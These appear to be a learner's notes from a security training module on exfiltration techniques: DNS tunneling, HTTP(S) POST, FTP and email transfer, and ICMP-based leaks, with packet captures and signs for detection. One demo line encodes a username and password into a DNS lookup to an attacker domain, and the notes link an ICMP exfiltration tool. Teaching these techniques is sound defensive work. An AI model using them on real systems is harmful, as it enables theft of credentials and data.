# 49. Explain Exfiltration Techniques

Trainer: Knox Hutchinson


## Introducing Attacker Exfiltration Techniques

- Learning goals
  - DNS tunneling exfiltration
  - HTTP exfiltration
  - file transfer
  - text-based protocols


## DNS Tunneling Exfiltration

- DNS exflitration overview
  - capturing with  Wireshark
  - pkt: src=10.10.21.16, dst=10.10.21.1, prot=DNS, info=Standard query 0xe4d1 A address
  - pkt: src=10.10.21.1, dst=10.10.21.16, prot=DNS, info=Standard query response 0xe4d1
    - L7: Domain Name System (response)
      - Queries: adservice.google.com: TYpe A, Class IN; Name = adservice.google.com
      - Answers
        - advervice.google.com: Type CNAME, class IN, cname pagedad46.l.doubleclick.net
        - pagead46.l.doubleclick.net: type A, class IN, addr 64.233.185.154
        - pagead46.l.doubleclick.net: type A, class IN, addr 64.233.185.155
        - ...
  - attacker
    - MitM attacks
    - malware in client to inset and send sensitive info
  - possible info exflitrated: username, password, file-shared locations, GPOs


- Demo: data exflitated by DNS queries
  - browsing https://www.base64encode.org: encode 'username=knox:password=cisco -> encode -> hex string abc
  - cmd: `nslookup abc.knoxsdata.com`
  - DNS query logged by attacker
  - decode the hex string abc back to username and password



## HTTP(S) Exfiltration

- HTTP(S) exfiltration overview
  - client able to access SQL DB
  - extract sensitive info from SQL DB, e.g., SELECT queries
  - convert the sensitive info into plan text, e.g., JSON, XML, etc.
  - using HTTP POST request to post the sensitive info to malicious web site
  - sign of data exfiltration: high volume of I/O, CPU utilization, or outbound data transmission


- Demo: HTTPS exfiltration
  - sensitive info embedded in encrypted payload
  - pkt: src=108.177.122.94, dst=10.10.21.16, prot=TLSv1.3, info=Application Data
    - L7: Transport Layer Security - TLSv1.3 Record Layer: Application Data PProtocol: http-over-tls
  - sign of exflitration: high volume of traffic w/ same src and dst



## Outbound File Transfers

- Outbound file transfer overview
  - email, ftp, etc. used to exfiltrate data
  - easiest way: sending data in nature
  - usually accessing shared files and database
  - malware in client
    - sending file to FTP, FTPS or SFTP servers
    - attaching file in emails
  - solution: AMP for endpoints, abnormal at NGFW


## Text-Based Protocols

- Text-based protocol overview
  - examples: ICMP, NTP, etc.
  - embedded sensitivity data in payload of protocol exchange
  - example script:
    - [ICMPExfil](https://github.com/martinoj2009/ICMPExfil)
    - sending w/ ICMP one character a time


## Recapping Exfiltration Techniques

- Symmary
  - malware sending sensitive data to attackers
  - types of exfiltration
    - DNS tunneling
    - HTTP(S) POST
    - file transfer via FTP or emails
    - plain-text protocols


